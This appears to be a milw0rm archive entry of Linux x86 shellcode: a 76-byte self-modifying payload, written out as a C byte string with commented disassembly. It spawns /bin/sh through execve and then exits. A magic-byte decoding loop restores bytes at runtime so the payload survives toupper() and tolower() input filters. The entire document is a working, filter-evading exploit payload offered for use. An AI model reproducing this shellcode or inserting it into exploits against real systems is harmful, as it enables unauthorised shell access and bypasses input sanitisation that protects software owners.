/*-------------------------------------------------------*/
/*     Magic Byte Self Modifying Code for surviving      */
/*               toupper() & tolower()                   */
/*        76bytes execve() _exit() code by XORt          */
/*-------------------------------------------------------*/
"\xeb\x34"               /* jmp $0x34          [revert]  */
"\x5e"                   /* pop %esi                     */
/*--set-up-variables-------------------------------------*/
"\x89\xf7"               /* mov %esi, %edi               */
"\x83\xef\x22"           /* sub $0x22, %edi              */
"\x31\xc9"               /* xor %ecx, %ecx               */
"\xb1\x8c"               /* mov $0x8c, %cl               */
"\xd1\xc9"               /* ror $0x1, %ecx    (70loops)  */
/*-scan-for-magic-byte-----------------------------------*/
"\xb0\x7b"               /* mov $0x7b, %al               */
"\xf2\xae"               /* repne scasb                  */
"\xff\xcf"               /* dec %edi                     */
"\xac"                   /* lodsb            (al=DS:SI)  */
"\x28\x07"               /* subb %al, (%edi)             */
/*--loop-back-to-scanner---------------------------------*/
"\xe2\xf5"               /* loop -$0xe      [load-byte]  */
/*-------------------------------------[length:25bytes]--*/
//                                                       //
/*--modified-shellcode-----------------------------------*/
"\x89\x7b\x08"           /* movl %esi, 0x8(%esi)        @*/
"\x91"                   /* xchg %eax, %ecx              */
"\x88\x7b\x07"           /* movb %al, 0x7(%esi)         @*/
"\x89\x7b\x0c"           /* movl %eax, 0xc(%esi)        @*/
"\xb0\x0b"               /* movb $0xb, %al               */
"\x89\xf3"               /* movl %esi, %ebx              */
"\x8d\x7b\x08"           /* leal 0x8(%esi), %ecx        @*/
"\x8d\x7b\x0c"           /* leal 0xc(%esi), %edx        @*/
"\xcd\x80"               /* int $0x80                    */
"\x31\xdb"               /* xorl %ebx, %ebx              */
"\x89\xd8"               /* movl %ebx, %eax              */
"\x40"                   /* inc %eax                     */
"\xcd\x80"               /* int $0x80                    */
/*--revert-----------------------------------------------*/
"\xe8\xc7\xff\xff\xff"   /* call -$0x39                  */
/*--offset-table-----------------------------------------*/
"\x05\x35\x35\x2d\x25\x19\x12\x0d\x08\x13"             /**/
/*--string-to-run----------------------------------------*/
"/\x7b\x7b\x7b/\x7b\x7b" /* .string "/bin/sh"            */
/*--------------------------------------[length:51bytes]-*/


// milw0rm.com [2004-12-22]